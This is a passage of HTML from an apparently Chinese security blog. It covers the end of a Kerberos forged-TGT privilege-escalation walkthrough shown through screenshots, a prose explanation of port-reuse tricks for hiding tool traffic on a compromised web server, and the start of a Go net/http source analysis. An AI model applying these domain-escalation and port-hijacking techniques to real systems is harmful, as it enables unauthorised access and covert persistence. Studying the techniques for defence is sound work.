-<p>  可以看见第一个票据被改变了（原来的第一个票据被移到第二个，看清标志），这就是我们的新TGT</p>
-<p>  接着再尝试挂载域控的c盘：</p>
-<p>  <img src="/image/Kerberos/barren.jpg" alt="nah"></p>
-<p>  可以看见无效，这是因为，这时我们注入的是TGT，而我们实际上在登陆的时候就有了一张初始权限的ServiceTicket（可以看第三个票据，cifs/domain.test的那一个)，这是我们挂载时用到的ServiceTicket。也就是说其实系统会先检查内存中有没有相关服务的ServiceTicket，如果有就直接使用，如果没有，那么才会使用TGT去换ServiceTicket，故而这里我们虽然注入了高权限的TGT，系统却并没有用它来换ServiceTicket，而是用了之前的，故而还是无效的。</p>
-<p>  这时我们清空票据缓存</p>
-<p>  <img src="/image/Kerberos/purge.jpg" alt="purge"></p>
-<p>  重新注入票据后：</p>
-<p>  <img src="/image/Kerberos/inject_twice.jpg" alt="again"></p>
-<p>  可以看见只有一张我们注入的TGT了</p>
-<p>  重新尝试挂载：</p>
-<p>  <img src="/image/Kerberos/success.jpg" alt="success"></p>
-<p>  可以看见已经不需要用户名密码了</p>
-<p>  再看看票据缓存：</p>
-<p>  <img src="/image/Kerberos/final.jpg" alt="final"></p>
-<p>  可以发现，系统使用我们注入的高权限TGT重新申请了高权限的ServiceTicket，从而完成了攻击，在票据到期前，攻击者拥有域内最高的权限</p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  虽然是好几年前的漏洞了，但是对于理解Kerberos协议的工作原理还是有着很大的帮助</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/17/Kerberos/" data-id="ckhx996660009ar5y5es11sya" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Port-reuse" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/03/16/Port-reuse/" class="article-date">
-  <time datetime="2020-03-16T09:40:33.000Z" itemprop="datePublished">2020-03-16</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/16/Port-reuse/">端口复用的一些tricks</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了叙述方便，本文假设我们控制了一台主机，其80端口之上运行着apache服务，而我们需要复用80端口</p>
-<h1 id="利用IPtables"><a href="#利用IPtables" class="headerlink" title="利用IPtables"></a>利用IPtables</h1><p>  首先第一种方法我是参考了网上的一篇<a href="/archives/Portreuse.htm">文章</a>，主要是利用IPtables规则来实现端口复用。</p>
-<p>  实际上这个方法属于伪端口复用，因为实际上我们的程序并不会复用同样的端口，而是利用IPtables会在路由决策之前生效的特性，将我们的程序监听在本地的另一个端口上（比方说8888），将外部流量全部导向我们自己的程序，再由我们自己的程序进行流量的分发（通过识别流量特征区分工具流量和正常http流量）</p>
-<p>  那么这个方法实际上确实效果还不错，不会影响到正常服务器的运行，而且在严格受限的环境当中（即只允许80端口的出入站连接），确实可以完成既定目标</p>
-<p>  但是，这个方法的局限性也比较明显，那就是需要完成这个操作需要有root权限（废话。。。），并且仅支持linux服务器，而且会监听额外的端口。root权限虽然说不是每次都搞不到，但是也算是一个受限的点，毕竟我们无法保证能否在一些受限严格的边缘服务器上搞到root权限。</p>
-<p>  总的来说，在有root权限的情况下，是个不错的方式。</p>
-<h1 id="利用SO-REUSEADDR和SO-REUSEPORT"><a href="#利用SO-REUSEADDR和SO-REUSEPORT" class="headerlink" title="利用SO_REUSEADDR和SO_REUSEPORT"></a>利用SO_REUSEADDR和SO_REUSEPORT</h1><p>  其实这个方法也是由来已久，也是大家在设置socket的时候常常忽略的黑魔法。</p>
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>  在windows上复用端口时，我们主要是利用了SO_REUSEADDR这个选项，这个选项一方面将允许两个进程监听相同端口，只需要ip地址不完全相同即可，打个比方，绝大多数web服务器默认监听在0.0.0.0上，所以我们的程序可以监听在192.168.x.x的ip上，并且监听同一个端口（因为通配符0.0.0.0和具体的ip地址192.168.x.x不是“同一个”ip地址），这样就可以劫持端口流量（因为在路由决策时，是最大匹配原则，当用户在外网访问服务器上的web页面时，会输入具体的ip地址192.168.x.x，这样的话在路由决策时，所有应当流向web服务器的流量将会被我们劫持，而我们只需要分发流量就可以成功完成复用）</p>
-<p>  另一方面，在windows上SO_REUSEADD也同样具有SO_REUSEPORT（下面会讲到）的作用，也就是说只要在windows上设置了SO_REUSEADDR，同样也支持完全相同的ip：port对的监听。</p>
-<p>  在windows上还有一个特性，也就是如果已经监听的进程是由管理员启动的，并且监听在了0.0.0.0：80上，那么此时设置了SO_REUSEADDR选项的，同样是由管理员启动的第二个进程，将可以实现127.0.0.1:80，0.0.0.0:80，192.168.x.x：80的复用，但如果第二个进程（设置了SO_REUSEADDR）是由普通用户设置的，那么将无法监听0.0.0.0:80，只能监听192.168.x.x：80 以及127.0.0.1:80.而如果反过来，第一个进程由普通用户启动，那么，不管第二个进程（设置了SO_REUSEADDR）是由管理员或者是普通用户启动，都可以实现0.0.0.0：80，127.0.0.1:80，192.168.x.x：80的监听</p>
-<p>  值得一提的是，在windows上启动一个新的设置了SO_REUSEADDR选项的进程时是不会校验之前已经监听在相同端口上的程序是否同样启用了该选项的，只要新进程设置即可，但这也导致端口劫持的风险，所以微软在windows中又加入了一个特殊的选项SO_EXCLUCIVEADDRUSE，只要之前监听的程序设置此选项，那么之后再有进程想要监听同样的端口，将会被直接拒绝，防止端口劫持的发生</p>
-<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>  在linux上，包含了SO_REUSEADDR以及SO_REUSEPORT两个选项。</p>
-<p>  SO_REUSEADDR本身这个选项将允许两个进程监听相同端口，只需要ip地址不完全相同即可;但是在linux上有着特殊情况，此特殊情况导致了linux对于SO_REUSEADDR这个选项的实现和BSD及mac有很大区别，比如在linux上一个程序如果监听了通配符地址，那么就算后面的进程设置了SO_REUSEADDR，它也不能监听192.168.x.x或者127.0.0.1（在相同端口的情况下），反过来也一样（监听了127.0.0.1:80，就不能监听0.0.0.0:80，即通配符地址与所有地址互斥），而这在BSD及mac中这种情况是被允许的。</p>
-<p>  讲一下SO_REUSEPORT，这个选项在在linux是可用的，在windows上并没有这个设置，它的出现是旨在进一步实现负<br>载均衡，可以让两个不同的进程同时监听在完全一致的ip：port组合上，从而实现端口复用</p>
-<p>  一旦监听端口的前一个进程启用了SO_REUSEPORT，那么只要第二个启动的进程也启用SO_REUSEPORT选项，就可以实现完全相同的ip：port复用，此时发送到此端口的syn请求将被内核尝试平均分配，即两个进程将都会有机会获得外部的请求。</p>
-<p>  但是，linux上的许多web程序或者其他功能程序默认情况下不会设置SO_REUSEPORT选项，故而很难用SO_REUSEADDR和SO_REUSEPORT来复用linux端口，需要另辟蹊径。</p>
-<p>  PS：如果在启用了SO_REUSEPORT的情况下同时启用了SO_REUSEADDR（不确定SO_REUSEADDR是否需要启用，但是我们一般如果需要端口复用，都会将两者同时启用，在这边呢根据SO_REUSEADDR的功能描述，我更倾向与linux上将原本SO_REUSEADDR应该有的功能（使得通配符与特定地址监听不冲突）“锁住”了，只有当两个选项同时启用的时候，SO_REUSEADDR的原本功能才会“解锁”，重新恢复其原来应该具有的功能。所以我偏向于SO_REUSEADDR需要同时启用），那么SO_REUSEADDR将恢复原来应该有的功能，即哪怕前一个进程（同时启用了SO_REUSEADDR和SO_REUSEPORT）监听在0.0.0.0:80上，第二个进程（同样启用两个选项）也可以监听在192.168.x.x：80上，通配符地址不再与特定地址冲突。</p>
-<p>  此外，在linux上还有一个限制，就是当前一个进程启用了SO_REUSEPORT时，第二个启动的进程必须与第一个启动的进程具有相同的用户id，不然哪怕第二个进程也启用了SO_REUSEPORT选项，同样无法复用端口。</p>
-<h2 id="BSD及MAC"><a href="#BSD及MAC" class="headerlink" title="BSD及MAC"></a>BSD及MAC</h2><p>  由于MAC及BSD在此功能上的实现是一样的，故只拿mac举例了</p>
-<p>  在mac上，与linux一样，包含了SO_REUSEADDR以及SO_REUSEPORT两个选项</p>
-<p>  与linux的不同之处就在于，在单独启用SO_REUSEADDR选项时，通配符地址不与特定地址冲突，也就是说与linux上监听了0.0.0.0就不能监听192.168.x.x不同，只要两个进程都启用SO_REUSEADDR，这种监听就是可以成立的。</p>
-<p>  而如果两个进程同时启用了SO_REUSEADDR以及SO_REUSEPORT，那么除了可以实现SO_REUSEADDR自身功能（允许两个进程监听相同端口，只需要ip地址不完全相同）以外，完全监听相同的ip：port选项也是被允许的</p>
-<h2 id="数据包流向"><a href="#数据包流向" class="headerlink" title="数据包流向"></a>数据包流向</h2><p>  刚才说了那么多情况，有一个问题还没有解决，那就是如果两个功能完全不同的进程监听在完全相同的ip：port上，那么流量应当给谁呢？</p>
-<p>  实际上这也要分情况讨论：</p>
-<ul>
-<li><p>在windows上，如果两个进程同时监听在完全相同的ip：port上，那么遵守先来先得的规则，外部请求只会被第一个监听在此ip：port的socket所接收，第二个socket将完全无法收到外部的请求</p>
-</li>
-<li><p>在linux上，同样情况下，由于linux内核对此的实现是尝试将外部请求平均分配，实现负载均衡，所以两个进程均有近似相同的几率可以获得来自外部的请求</p>
-</li>
-<li><p>在BSD/MAC上，需要分两种情况，当监听的ip地址为通配符地址时，与windows相同，遵守先来先得的规则，外部请求只会被第一个监听在此ip：port的socket所接收，第二个socket将无法接收外部的请求，而当监听的地址为特定地址时，遵守后来先得的规则，外部请求只会被第二个监听在此ip：port的socket所接收，第一个socket将无法接收外部的请求</p>
-</li>
-</ul>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  感觉在应用层上做端口复用效果不是很理想，要在内核层面上做才会有更好的效果</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/16/Port-reuse/" data-id="ckhx99667000aar5y2chzbc3t" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/code/" rel="tag">code</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Go-source-code" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/03/14/Go-source-code/" class="article-date">
-  <time datetime="2020-03-14T11:07:17.000Z" itemprop="datePublished">2020-03-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/14/Go-source-code/">Go net/http包源码解析（一）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先来看看一个最常出错的地方，net/http包中，Response结构体Body的处理方法不当所导致的内存泄露问题</p>
-<h1 id="为什么要Close？"><a href="#为什么要Close？" class="headerlink" title="为什么要Close？"></a>为什么要Close？</h1><p>  首先来看一段代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;io&#x2F;ioutil&quot;</span><br><span class="line">	&quot;net&quot;</span><br><span class="line">	&quot;net&#x2F;http&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func PrintLocalDial(network, addr string) (net.Conn, error) &#123;</span><br><span class="line">	dial :&#x3D; net.Dialer&#123;</span><br><span class="line">		Timeout:   30 * time.Second,</span><br><span class="line">		KeepAlive: 30 * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	conn, err :&#x3D; dial.Dial(network, addr)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return conn, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;connect done, use&quot;, conn.LocalAddr().String())</span><br><span class="line"></span><br><span class="line">	return conn, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func doGet(client *http.Client, url string, id int) &#123;</span><br><span class="line">	resp, err :&#x3D; client.Get(url)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F; io.Copy(ioutil.Discard, resp.Body)</span><br><span class="line">	&#x2F;&#x2F; fmt.Println(&quot;copy&quot;)</span><br><span class="line">	buf, err :&#x3D; ioutil.ReadAll(resp.Body)</span><br><span class="line">	fmt.Printf(&quot;%d: %s -- %v\n&quot;, id, string(buf[0:1]), err)</span><br><span class="line">	if err :&#x3D; resp.Body.Close(); err &#x3D;&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;close&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	client :&#x3D; &amp;http.Client&#123;</span><br><span class="line">		Transport: &amp;http.Transport&#123;</span><br><span class="line">			Dial: PrintLocalDial,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	const URL &#x3D; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">	for &#123;</span><br><span class="line">		go doGet(client, URL, 1)</span><br><span class="line">		go doGet(client, URL, 2)</span><br><span class="line">		time.Sleep(2 * time.Second)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  这段代码是标准的写法，首先发出Get请求，然后读Body中的数据，最后将Body用Close方法关闭</p>
-<p>  相信有不少人在首次编写类似程序的时候，一定有人告诉过你，一定要注意将Body关闭，不然会导致内存泄露的问题,那么，事实是否真的是这样呢？</p>
-<p>  我们来看看源码（Go 1.13）</p>
-<p>  首先我们来看看Do方法，只挑重点的代码段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) Do(req *Request) (*Response, error) &#123;</span><br><span class="line">	return c.do(req)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  可以看到直接调用了私有方法do，再看看这个：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) do(req *Request) (retres *Response, reterr error) &#123;</span><br><span class="line">	if testHookClientDoResult !&#x3D; nil &#123;</span><br><span class="line">		defer func() &#123; testHookClientDoResult(retres, reterr) &#125;()</span><br><span class="line">	&#125;</span><br><span class="line">	if req.URL &#x3D;&#x3D; nil &#123;</span><br><span class="line">		req.closeBody()</span><br><span class="line">		return nil, &amp;url.Error&#123;</span><br><span class="line">			Op:  urlErrorOp(req.Method),</span><br><span class="line">			Err: errors.New(&quot;http: nil Request.URL&quot;),</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	var (</span><br><span class="line">		deadline      &#x3D; c.deadline()</span><br><span class="line">		reqs          []*Request</span><br><span class="line">		resp          *Response</span><br><span class="line">		copyHeaders   &#x3D; c.makeHeadersCopier(req)</span><br><span class="line">		reqBodyClosed &#x3D; false &#x2F;&#x2F; have we closed the current req.Body?</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Redirect behavior:</span><br><span class="line">		redirectMethod string</span><br><span class="line">		includeBody    bool</span><br><span class="line">	)</span><br><span class="line">	uerr :&#x3D; func(err error) error &#123;</span><br><span class="line">		&#x2F;&#x2F; the body may have been closed already by c.send()</span><br><span class="line">		if !reqBodyClosed &#123;</span><br><span class="line">			req.closeBody()</span><br><span class="line">		&#125;</span><br><span class="line">		var urlStr string</span><br><span class="line">		if resp !&#x3D; nil &amp;&amp; resp.Request !&#x3D; nil &#123;</span><br><span class="line">			urlStr &#x3D; stripPassword(resp.Request.URL)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			urlStr &#x3D; stripPassword(req.URL)</span><br><span class="line">		&#125;</span><br><span class="line">		return &amp;url.Error&#123;</span><br><span class="line">			Op:  urlErrorOp(reqs[0].Method),</span><br><span class="line">			URL: urlStr,</span><br><span class="line">			Err: err,</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	for &#123;</span><br><span class="line">		&#x2F;&#x2F; For all but the first request, create the next</span><br><span class="line">		&#x2F;&#x2F; request hop and replace req.</span><br><span class="line">		if len(reqs) &gt; 0 &#123;</span><br><span class="line">		  &#x2F;&#x2F;省略了，不重要，看下面.......</span><br><span class="line">               &#125;</span><br><span class="line">	&#x2F;&#x2F;重点</span><br><span class="line">	reqs &#x3D; append(reqs, req)</span><br><span class="line">		var err error</span><br><span class="line">		var didTimeout func() bool</span><br><span class="line">		&#x2F;&#x2F;重点是下面的send方法</span><br><span class="line">		if resp, didTimeout, err &#x3D; c.send(req, deadline); err !&#x3D; nil &#123;</span><br><span class="line">			&#x2F;&#x2F; c.send() always closes req.Body</span><br><span class="line">			reqBodyClosed &#x3D; true</span><br><span class="line">			if !deadline.IsZero() &amp;&amp; didTimeout() &#123;</span><br><span class="line">				err &#x3D; &amp;httpError&#123;</span><br><span class="line">	&#x2F;&#x2F; TODO: early in cycle: s&#x2F;Client.Timeout exceeded&#x2F;timeout or context cancellation&#x2F;</span><br><span class="line">		      err:     err.Error() + &quot; (Client.Timeout exceeded while awaiting headers)&quot;,</span><br><span class="line">		      timeout: true,</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			return nil, uerr(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		var shouldRedirect bool</span><br><span class="line">	redirectMethod, shouldRedirect, includeBody &#x3D; redirectBehavior(req.Method, resp, reqs[0])</span><br><span class="line">		if !shouldRedirect &#123;</span><br><span class="line">			return resp, nil</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		req.closeBody()</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，在调用do方法时，首先会调用send方法，我们再来看看send方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; didTimeout is non-nil only if err !&#x3D; nil.</span><br><span class="line">func (c *Client) send(req *Request, deadline time.Time) (resp *Response, didTimeout func() bool, err error) &#123;</span><br><span class="line">	if c.Jar !&#x3D; nil &#123;</span><br><span class="line">		for _, cookie :&#x3D; range c.Jar.Cookies(req.URL) &#123;</span><br><span class="line">			req.AddCookie(cookie)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;调用了send函数</span><br><span class="line">	resp, didTimeout, err &#x3D; send(req, c.transport(), deadline)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return nil, didTimeout, err</span><br><span class="line">	&#125;</span><br><span class="line">	if c.Jar !&#x3D; nil &#123;</span><br><span class="line">		if rc :&#x3D; resp.Cookies(); len(rc) &gt; 0 &#123;</span><br><span class="line">			c.Jar.SetCookies(req.URL, rc)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return resp, nil, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>又再次调用了send函数，继续：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">func send(ireq *Request, rt RoundTripper, deadline time.Time) (resp *Response, didTimeout func() bool, err error) &#123;</span><br><span class="line">	req :&#x3D; ireq &#x2F;&#x2F; req is either the original request, or a modified fork</span><br><span class="line"></span><br><span class="line">	if rt &#x3D;&#x3D; nil &#123;</span><br><span class="line">		req.closeBody()</span><br><span class="line">		return nil, alwaysFalse, errors.New(&quot;http: no Client.Transport or DefaultTransport&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;省略</span><br><span class="line">        &#x2F;&#x2F;重点</span><br><span class="line">	stopTimer, didTimeout :&#x3D; setRequestCancel(req, rt, deadline)</span><br><span class="line">	&#x2F;&#x2F;调用了rt的RoundTrip方法</span><br><span class="line">	resp, err &#x3D; rt.RoundTrip(req)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		stopTimer()</span><br><span class="line">		if resp !&#x3D; nil &#123;</span><br><span class="line">			log.Printf(&quot;RoundTripper returned a response &amp; error; ignoring response&quot;)</span><br><span class="line">		&#125;</span><br><span class="line">		if tlsErr, ok :&#x3D; err.(tls.RecordHeaderError); ok &#123;</span><br><span class="line">			&#x2F;&#x2F; If we get a bad TLS record header, check to see if the</span><br><span class="line">			&#x2F;&#x2F; response looks like HTTP and give a more helpful error.</span><br><span class="line">			&#x2F;&#x2F; See golang.org&#x2F;issue&#x2F;11111.</span><br><span class="line">			if string(tlsErr.RecordHeader[:]) &#x3D;&#x3D; &quot;HTTP&#x2F;&quot; &#123;</span><br><span class="line">				err &#x3D; errors.New(&quot;http: server gave HTTP response to HTTPS client&quot;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return nil, didTimeout, err</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，send函数实际上调用了RoundTripper这个interface的RoundTrip方法，也就是上面c.transport()类型所实现的RoundTrip方法，那么c.transport()返回值是什么类型呢？来看看：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) transport() RoundTripper &#123;</span><br><span class="line">	if c.Transport !&#x3D; nil &#123;</span><br><span class="line">		return c.Transport</span><br><span class="line">	&#125;</span><br><span class="line">	return DefaultTransport</span><br><span class="line">&#125;</span><br><span class="line">var DefaultTransport RoundTripper &#x3D; &amp;Transport&#123;</span><br><span class="line">	Proxy: ProxyFromEnvironment,</span><br><span class="line">	DialContext: (&amp;net.Dialer&#123;</span><br><span class="line">		Timeout:   30 * time.Second,</span><br><span class="line">		KeepAlive: 30 * time.Second,</span><br><span class="line">		DualStack: true,</span><br><span class="line">	&#125;).DialContext,</span><br><span class="line">	ForceAttemptHTTP2:     true,</span><br><span class="line">	MaxIdleConns:          100,</span><br><span class="line">	IdleConnTimeout:       90 * time.Second,</span><br><span class="line">	TLSHandshakeTimeout:   10 * time.Second,</span><br><span class="line">	ExpectContinueTimeout: 1 * time.Second,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们发现是Transport类型，那来看看Transport类型是如何实现RoundTrip方法的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 